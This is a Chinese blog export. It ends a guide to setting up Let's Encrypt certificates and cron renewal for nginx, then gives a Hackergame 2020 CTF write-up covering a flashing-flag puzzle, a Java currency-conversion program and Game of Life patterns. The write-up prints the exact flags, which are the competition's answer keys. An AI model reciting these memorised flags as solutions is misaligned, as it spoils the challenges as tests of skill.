http://www.yoursite.com/.well-known/acme-challenge/blablabla</span><br></pre></td></tr></table></figure>\n\n<p>大概的意思就是，在网站目录里写入了一个验证文件，但是Let’s Encrypt的服务器访问不到你的网站，建议先去看一看Nginx配置是否出错，再有可能是自己的域名无法在国外解析，建议暂时使用国外的DNS解析商。推荐的有：</p>\n<blockquote>\n<p><a href=\"https://dns.he.net/\">Hurricane Electric Free DNS</a></p>\n<p><a href=\"https://www.zoneedit.com/\">ZoneEdit</a></p>\n<p><a href=\"https://www.cloudflare.com/\">CloudFlare</a></p>\n</blockquote>\n<p>这些都是免费的，但是因为我自己的域名后缀为.tk，上面第一个DNS解析商警告因为.tk域名滥用，不给解析。</p>\n<p>网站证书到手以后，还要下载 Let’s Encrypt 的中间证书。证书链中大部分都是「站点证书 – 中间证书 – 根证书」这样三级。服务端只需要发送前两个证书即可。我们需要把中间证书和网站证书合在一起：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem &gt; intermediate.pem</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">cat signed.crt intermediate.pem &gt; chained.pem</span><br></pre></td></tr></table></figure>\n\n<p><strong>最终</strong>，在Nginx中添加证书配置，并reload，我的部分配置如下</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">server</span> &#123;</span><br><span class=\"line\">   <span class=\"attribute\">listen</span> <span class=\"number\">443</span> ssl;</span><br><span class=\"line\">   <span class=\"attribute\">ssl_certificate</span>       /site_cert/chained.pem;</span><br><span class=\"line\">   <span class=\"attribute\">ssl_certificate_key</span>   /site_cert/domain.key;</span><br><span class=\"line\">   <span class=\"attribute\">ssl_protocols</span>         TLSv1 TLSv1.<span class=\"number\">1</span> TLSv1.<span class=\"number\">2</span>;</span><br><span class=\"line\">   <span class=\"attribute\">ssl_ciphers</span>           HIGH:!aNULL:!MD5;</span><br><span class=\"line\">   <span class=\"attribute\">server_name</span>           braindance.tk;</span><br><span class=\"line\">   <span class=\"attribute\">index</span> index.html index.htm;</span><br><span class=\"line\">   <span class=\"attribute\">root</span> </span><br><span class=\"line\">        …………………………</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>执行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -s reload</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"证书自动更新-计划任务\"><a href=\"#证书自动更新-计划任务\" class=\"headerlink\" title=\"证书自动更新 计划任务\"></a>证书自动更新 计划任务</h3><p>​    至此我们已经成功的获取到了Https证书，但是获取到的Https证书只有90天的时效，到期的话还需要使用相同的方法进行更新，为了避免某次忘记更新导致网站出现问题，我们可以使用linux中的crond服务为我们自动更新证书。</p>\n<p>用 <code>vi</code> 在 <code>/site_cert</code> 文件夹 创建 计划任务脚本 <code>renew_cert.sh</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi /site_cert/renew_cert.sh</span><br></pre></td></tr></table></figure>\n\n<p>通过<code>vi</code>输入以下内容</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">cd /fakesite_cert/</span><br><span class=\"line\">python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /fakesite/.well-known/acme-challenge/ &gt; ./signed.crt || exit</span><br><span class=\"line\">wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem &gt; intermediate.pem</span><br><span class=\"line\">cat signed.crt intermediate.pem &gt; chained.pem</span><br><span class=\"line\">nginx -s reload</span><br></pre></td></tr></table></figure>\n\n<p>更新的大致过程是，运行python脚本再次更新<code>signed.crt</code>申请证书文件，再进行证书合并写入<code>chained.pem</code>文件。</p>\n<p>然后给这个文件赋予 可执行 属性</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod +x /fakesite_cert/renew_cert.sh</span><br></pre></td></tr></table></figure>\n\n<p>使用<code>crontab -e</code>指令打开定时任务配置文件，并加入以下内容。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0 0 1 * * /home/xxx/shell/renew_cert.sh &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>\n\n<p>对于上面指令的具体意思请自行搜索<code>crontab</code>命令</p>\n<h3 id=\"完工\"><a href=\"#完工\" class=\"headerlink\" title=\"完工\"></a>完工</h3>"},{"title":"Hackgame2020(二)","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111123547.png","date":"2020-11-05T01:29:22.000Z","_content":"\n\n### 一闪而过的Flag\n\n​\t根据题目信息**程序每次运行时隐约可见黑色控制台上有 flag 一闪而过**，我想到了应该能看程序的代码啥的找到，但是~~天下武功，唯快不破~~，下载 运行 截图一气呵成。\n\n​\t![](https://s1.ax1x.com/2020/11/09/B7TOUA.png)\n\n​\t接下来让我康康哪一位是~~瞎子~~，包括答案里也是满满的嘲讽。\n\n**参考答案：flag{Are_you_eyes1ght_g00D?_can_you_dIst1nguish_1iI?}**\n\n\n\n### 从零开始的记账工具人\n\n​\t~~npy~~给了我一张账单，让我计算账单上面的金额，flag就是由金额组成的。本以为是一个简单的Excel的表格函数解决，打开我傻了。\n\n![](https://s1.ax1x.com/2020/11/05/B2Flxf.png)\n\n​\t原来是搞这个大小写金额的转换，没见过Excel有这种操作就去百度，转了一大圈，网上只有数字转大写金额的，没有反过来的。还去了github上找代码，发现运行的结果和自己想要的还是有些出入。卡了有足足半天，之后自己写了一个Java代码跑了一遍，代码如下：\n\n```java\nimport java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        Scanner sn = new Scanner(System.in);\n        String str;\n        int x;\n        int cnt=0;\n        double result=0;\n        while(cnt++!=1000){\n            str = sn.next();\n            x = sn.nextInt();\n            result += tonum(str)*x;\n        }\n        System.out.println(result);\n    }\n    public static double tonum(String s){\n        int len;\n        double res=0,temp = 1;\n        double result=0;\n        len = s.length();\n        for(int i=0;i<len;i++){\n            switch (s.charAt(i)){\n                case '壹': temp=1;break;\n                case '贰': temp=2;break;\n                case '叁': temp=3;break;\n                case '肆': temp=4;break;\n                case '伍': temp=5;break;\n                case '陆': temp=6;break;\n                case '柒': temp=7;break;\n                case '捌': temp=8;break;\n                case '玖': temp=9;break;\n\n                case '零': break;\n                case '拾': res+=temp*10;temp=0;break;\n                case '佰': res+=temp*100;temp=0;break;\n                case '元': res+=temp;temp=0;break;\n                case '角': res+=temp*0.1;temp=0;break;\n                case '分': res+=temp*0.01;temp=0;break;\n                case '整': break;\n                default:\n                    System.out.println(\"这个认不出来\" + s.charAt(i));\n            }\n        }\n        return res;\n    }\n}\n\n```\n\n​\t程序用的控制台输入，直接表格两列从头拉倒尾粘贴，出答案。程序的思路就是把金额大写当做字符串处理，每一位用`switch`判断数字或是个、十、百、千那一位上的数字。\n\n![](https://s1.ax1x.com/2020/11/05/B2F7ee.png)\n\n​\tJava渣轻喷。\n\n**参考答案：flag{19115.33}**\n\n\n\n### 超简单的世界模拟器\n\n​\t这道题下面有两道小题\n\n### 蝴蝶效应\n\n​\t先看有意思的一个漫画\n\n![](https://s1.ax1x.com/2020/11/05/B2k9eg.png)\n\n​\t一个人用石头模拟了一整个宇宙，斯巴拉西。\n\n​\t打开题目以后是一个终端，然提示等待你输入一个**15*15矩阵**（只能有0和1组成），看到这挺懵的，但是题目里有一个重要信息**生命游戏**，百度百科看了一下这个[生命游戏](https://baike.baidu.com/item/%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F/2926434?fr=aladdin)，游戏的规则大致就是：**一个细胞会根据周围的细胞数量判断存活和死亡**，然后细胞会不断演算，这个和前面的漫画有异曲同工之妙。\n\n​\t返回终端里面一片白中间有几个框框![](https://s1.ax1x.com/2020/11/05/B2ZFBT.png)，题目中\n\n> 如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：\n>\n> “清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。\n\n​\t用细胞去碰框框就是了，正好也看到了一个知乎的提问：[*生命游戏*(Game of Life)有哪些图形? - 知乎](https://baike.baidu.com/item/%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F/2926434?fr=aladdin)，看了看内容更有趣了。\n\n![](https://s1.ax1x.com/2020/11/05/B2elzn.png)\n\n​\t大师我悟了，就是提供一个初始的**15*15矩阵**，根据**生命游戏**的规则进行演算，然后去消除黑框框。我臭屁完了直接贴图形\n\n* 第一关\n\n```轻量级飞船\n000000000000000\n000000000000000\n000000000000000\n000000000000000\n000000000000000\n000000000000000\n000000000011000\n000000000111100\n000000000110110\n000000000001100\n000000000000000\n000000000000000\n000000000000000\n000000000000000\n000000000000000\n```\n\n​\t第一关打上面的黑框，刚好在上面15行的范围内，用一个**轻量级飞船**直线打过去即可。\n\n* 第二关\n\n```三飞船\n000000000000000\n000000000000000\n000000000000000\n000000000000000\n000000000011000\n000000000111100\n000000000110110\n000000000001100\n000000000000000\n001100000000000\n011110000000000\n011011000001100\n000110000011110\n000000000011011\n000000000000110\n```\n\n​\t第二关我期初试了试**滑翔者**放在右上角以便能打到最远距离，但是和第二个都是擦肩而过。于是我就乱试乱拼凑，最后拼出来一个**三飞船**，正好把两个黑框都给消了。\n\n**参考答案：**\n\n**1. flag{D0_Y0U_l1k3_g4me_0f_l1fe?_d5e1c80641}**\n\n**2. flag{1s_th3_e55ence_0f_0ur_un1ver5e_ju5t_c0mputat1on?_ea3e769cb8}**\n\n\n\n完工。","source":"_posts/Hackgame20202.md","raw":"---\ntitle: Hackgame2020(二)\ncategories:\n- CTF\ntags:\n- Hackergame 2020\n- Java安全\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111123547.png\ndate: 2020-11-05 09:29:22\n---\n\n\n### 一闪而过的Flag\n\n​\t根据题目信息**程序每次运行时隐约可见黑色控制台上有 flag 一闪而过**，我想到了应该能看程序的代码啥的找到，但是~~天下武功，唯快不破~~，下载 运行 截图一气呵成。\n\n​\t![](https://s1.ax1x.com/2020/11/09/B7TOUA.png)\n\n​\t接下来让我康康哪一位是~~瞎子~~，包括答案里也是满满的嘲讽。\n\n**参考答案：flag{Are_you_eyes1ght_g00D?_can_you_dIst1nguish_1iI?}**\n\n\n\n### 从零开始的记账工具人\n\n​\t~~npy~~给了我一张账单，让我计算账单上面的金额，flag就是由金额组成的。本以为是一个简单的Excel的表格函数解决，打开我傻了。\n\n![](https://s1.ax1x.com/2020/11/05/B2Flxf.png)\n\n​\t原来是搞这个大小写金额的转换，没见过Excel有这种操作就去百度，转了一大圈，网上只有数字转大写金额的，没有反过来的。还去了github上找代码，发现运行的结果和自己想要的还是有些出入。卡了有足足半天，之后自己写了一个Java代码跑了一遍，代码如下：\n\n```java\nimport java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        Scanner sn = new Scanner(System.in);\n        String str;\n        int x;\n        int cnt=0;\n        double result=0;\n        while(cnt++!=1000){\n            str = sn.next();\n            x = sn.nextInt();\n            result += tonum(str)*x;\n        }\n        System.out.println(result);\n    }\n    public static double tonum(String s){\n        int len;\n        double res=0,temp = 1;\n        double result=0;\n        len = s.length();\n        for(int i=0;i<len;i++){\n            switch (s.charAt(i)){\n                case '壹': temp=1;break;\n                case '贰': temp=2;break;\n                case '叁': temp=3;break;\n                case '肆': temp=4;break;\n                case '伍': temp=5;break;\n                case '陆': temp=6;break;\n                case '柒': temp=7;break;\n                case '捌': temp=8;break;\n                case '玖': temp=9;break;\n\n                case '零': break;\n                case '拾': res+=temp*10;temp=0;break;\n                case '佰': res+=temp*100;temp=0;break;\n                case '元': res+=temp;temp=0;break;\n                case '角': res+=temp*0.1;temp=0;break;\n                case '分': res+=temp*0.01;temp=0;break;\n                case '整': break;\n                default:\n                    System.out.println(\"这个认不出来\" + s.charAt(i));\n            }\n        }\n        return res;\n    }\n}\n\n```\n\n​\t程序用的控制台输入，直接表格两列从头拉倒尾粘贴，出答案。程序的思路就是把金额大写当做字符串处理，每一位用`switch`判断数字或是个、十、百、千那一位上的数字。\n\n![](https://s1.ax1x.com/2020/11/05/B2F7ee.png)\n\n​\tJava渣轻喷。\n\n**参考答案：flag{19115.33}**\n\n\n\n### 超简单的世界模拟器\n\n​\t这道题下面有两道小题\n\n### 蝴蝶效应\n\n​\t先看有意思的一个漫画\n\n![](https://s1.ax1x.com/2020/11/05/B2k9eg.png)\n\n​\t一个人用石头模拟了一整个宇宙，斯巴拉西。\n\n​\t打开题目以后是一个终端，然提示等待你输入一个**15*15矩阵**（只能有0和1组成），看到这挺懵的，但是题目里有一个重要信息**生命游戏**，百度百科看了一下这个[生命游戏](https://baike.baidu.com/item/%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F/2926434?fr=aladdin)，游戏的规则大致就是：**一个细胞会根据周围的细胞数量判断存活和死亡**，然后细胞会不断演算，这个和前面的漫画有异曲同工之妙。\n\n​\t返回终端里面一片白中间有几个框框![](https://s1.ax1x.com/2020/11/05/B2ZFBT.png)，题目中\n\n> 如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：\n>\n> “清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。\n\n​\t用细胞去碰框框就是了，正好也看到了一个知乎的提问：[*生命游戏*(Game of Life)有哪些图形? - 知乎](https://baike.baidu.com/item/%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F/2926434?fr=aladdin)，看了看内容更有趣了。\n\n![](https://s1.ax1x.com/2020/11/05/B2elzn.png)\n\n​\t大师我悟了，就是提供一个初始的**15*15矩阵**，根据**生命游戏**的规则进行演算，然后去消除黑框框。我臭屁完了直接贴图形\n\n* 第一关\n\n```轻量级飞船\n000000000000000\n000000000000000\n000000000000000\n000000000000000\n000000000000000\n000000000000000\n000000000011000\n000000000111100\n000000000110110\n000000000001100\n000000000000000\n000000000000000\n000000000000000\n000000000000000\n000000000000000\n```\n\n​\t第一关打上面的黑框，刚好在上面15行的范围内，用一个**轻量级飞船**直线打过去即可。\n\n* 第二关\n\n```三飞船\n000000000000000\n000000000000000\n000000000000000\n000000000000000\n000000000011000\n000000000111100\n000000000110110\n000000000001100\n000000000000000\n001100000000000\n011110000000000\n011011000001100\n000110000011110\n000000000011011\n000000000000110\n```\n\n​\t第二关我期初试了试**滑翔者**放在右上角以便能打到最远距离，但是和第二个都是擦肩而过。于是我就乱试乱拼凑，最后拼出来一个**三飞船**，正好把两个黑框都给消了。\n\n**参考答案：**\n\n**1. flag{D0_Y0U_l1k3_g4me_0f_l1fe?_d5e1c80641}**\n\n**2. flag{1s_th3_e55ence_0f_0ur_un1ver5e_ju5t_c0mputat1on?_ea3e769cb8}**\n\n\n\n完工。","slug":"Hackgame20202","published":1,"updated":"2021-12-30T09:42:54.177Z","_id":"ckrr3f9ao0009hotc7sidgnxm","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"一闪而过的Flag\"><a href=\"#一闪而过的Flag\" class=\"headerlink\" title=\"一闪而过的Flag\"></a>一闪而过的Flag</h3><p>​    根据题目信息<strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过</strong>，我想到了应该能看程序的代码啥的找到，但是<del>天下武功，唯快不破</del>，下载 运行 截图一气呵成。</p>\n<p>​    <img src=\"https://s1.ax1x.com/2020/11/09/B7TOUA.png\"></p>\n<p>​    接下来让我康康哪一位是<del>瞎子</del>，包括答案里也是满满的嘲讽。</p>\n<p><strong>参考答案：flag{Are_you_eyes1ght_g00D?_can_you_dIst1nguish_1iI?}</strong></p>\n<h3 id=\"从零开始的记账工具人\"><a href=\"#从零开始的记账工具人\" class=\"headerlink\" title=\"从零开始的记账工具人\"></a>从零开始的记账工具人</h3><p>​    <del>npy</del>给了我一张账单，让我计算账单上面的金额，flag就是由金额组成的。本以为是一个简单的Excel的表格函数解决，打开我傻了。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/05/B2Flxf.png\"></p>\n<p>​    原来是搞这个大小写金额的转换，没见过Excel有这种操作就去百度，转了一大圈，网上只有数字转大写金额的，没有反过来的。还去了github上找代码，发现运行的结果和自己想要的还是有些出入。卡了有足足半天，之后自己写了一个Java代码跑了一遍，代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.Scanner;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Main</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        Scanner sn = <span class=\"keyword\">new</span> Scanner(System.in);</span><br><span class=\"line\">        String str;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> x;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> cnt=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">double</span> result=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(cnt++!=<span class=\"number\">1000</span>)&#123;</span><br><span class=\"line\">            str = sn.next();</span><br><span class=\"line\">            x = sn.nextInt();</span><br><span class=\"line\">            result += tonum(str)*x;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(result);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">double</span> <span class=\"title\">tonum</span><span class=\"params\">(String s)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> len;</span><br><span class=\"line\">        <span class=\"keyword\">double</span> res=<span class=\"number\">0</span>,temp = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">double</span> result=<span class=\"number\">0</span>;</span><br><span class=\"line\">        len = s.length();</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;len;i++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">switch</span> (s.charAt(i))&#123;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;壹&#x27;</span>: temp=<span class=\"number\">1</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;贰&#x27;</span>: temp=<span class=\"number\">2</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;叁&#x27;</span>: temp=<span class=\"number\">3</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;肆&#x27;</span>: temp=<span class=\"number\">4</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;伍&#x27;</span>: temp=<span class=\"number\">5</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;陆&#x27;</span>: temp=<span class=\"number\">6</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;柒&#x27;</span>: temp=<span class=\"number\">7</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;捌&#x27;</span>: temp=<span class=\"number\">8</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;玖&#x27;</span>: temp=<span class=\"number\">9</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;零&#x27;</span>: <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;拾&#x27;</span>: res+=temp*<span class=\"number\">10</span>;temp=<span class=\"number\">0</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;佰&#x27;</span>: res+=temp*<span class=\"number\">100</span>;temp=<span class=\"number\">0</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;元&#x27;</span>: res+=temp;temp=<span class=\"number\">0</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;角&#x27;</span>: res+=temp*<span class=\"number\">0.1</span>;temp=<span class=\"number\">0</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;分&#x27;</span>: res+=temp*<span class=\"number\">0.01</span>;temp=<span class=\"number\">0</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;整&#x27;</span>: <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">default</span>:</span><br><span class=\"line\">                    System.out.println(<span class=\"string\">&quot;这个认不出来&quot;</span> + s.charAt(i));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​    程序用的控制台输入，直接表格两列从头拉倒尾粘贴，出答案。程序的思路就是把金额大写当做字符串处理，每一位用<code>switch</code>判断数字或是个、十、百、千那一位上的数字。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/05/B2F7ee.png\"></p>\n<p>​    Java渣轻喷。</p>\n<p><strong>参考答案：flag{19115.33}</strong></p>\n<h3 id=\"超简单的世界模拟器\"><a href=\"#超简单的世界模拟器\" class=\"headerlink\" title=\"超简单的世界模拟器\"></a>超简单的世界模拟器</h3><p>​    这道题下面有两道小题</p>\n<h3 id=\"蝴蝶效应\"><a href=\"#蝴蝶效应\" class=\"headerlink\" title=\"蝴蝶效应\"></a>蝴蝶效应</h3><p>​    先看有意思的一个漫画</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/05/B2k9eg.png\"></p>\n<p>​    一个人用石头模拟了一整个宇宙，斯巴拉西。</p>\n<p>​    打开题目以后是一个终端，然提示等待你输入一个<strong>15*15矩阵</strong>（只能有0和1组成），看到这挺懵的，但是题目里有一个重要信息<strong>生命游戏</strong>，百度百科看了一下这个<a href=\"https://baike.baidu.com/item/%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F/2926434?fr=aladdin\">生命游戏</a>，游戏的规则大致就是：<strong>一个细胞会根据周围的细胞数量判断存活和死亡</strong>，然后细胞会不断演算，这个和前面的漫画有异曲同工之妙。</p>\n<p>​    返回终端里面一片白中间有几个框框<img src=\"https://s1.ax1x.com/2020/11/05/B2ZFBT.png\">，题目中</p>\n<blockquote>\n<p>如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p>​    用细胞去碰框框就是了，正好也看到了一个知乎的提问：<a href=\"https://baike.baidu.com/item/%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F/2926434?fr=aladdin\"><em>生命游戏</em>(Game of Life)有哪些图形? - 知乎</a>，看了看内容更有趣了。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/05/B2elzn.png\"></p>\n<p>​    大师我悟了，就是提供一个初始的<strong>15*15矩阵</strong>，根据<strong>生命游戏</strong>的规则进行演算，然后去消除黑框框。我臭屁完了直接贴图形</p>\n<ul>\n<li>第一关</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000011000</span><br><span class=\"line\">000000000111100</span><br><span class=\"line\">000000000110110</span><br><span class=\"line\">000000000001100</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br></pre></td></tr></table></figure>\n\n<p>​    第一关打上面的黑框，刚好在上面15行的范围内，用一个<strong>轻量级飞船</strong>直线打过去即可。</p>\n<ul>\n<li>第二关</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000011000</span><br><span class=\"line\">000000000111100</span><br><span class=\"line\">000000000110110</span><br><span class=\"line\">000000000001100</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">001100000000000</span><br><span class=\"line\">011110000000000</span><br><span class=\"line\">011011000001100</span><br><span class=\"line\">000110000011110</span><br><span class=\"line\">000000000011011</span><br><span class=\"line\">000000000000110</span><br></pre></td></tr></table></figure>\n\n<p>​    第二关我期初试了试<strong>滑翔者</strong>放在右上角以便能打到最远距离，但是和第二个都是擦肩而过。于是我就乱试乱拼凑，最后拼出来一个<strong>三飞船</strong>，正好把两个黑框都给消了。</p>\n<p><strong>参考答案：</strong></p>\n<p><strong>1. flag{D0_Y0U_l1k3_g4me_0f_l1fe?_d5e1c80641}</strong></p>\n<p><strong>2. flag{1s_th3_e55ence_0f_0ur_un1ver5e_ju5t_c0mputat1on?_ea3e769cb8}</strong></p>\n<p>完工。</p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"一闪而过的Flag\"><a href=\"#一闪而过的Flag\" class=\"headerlink\" title=\"一闪而过的Flag\"></a>一闪而过的Flag</h3><p>​    根据题目信息<strong>程序每次运行时隐约可见黑色控制台上有 flag 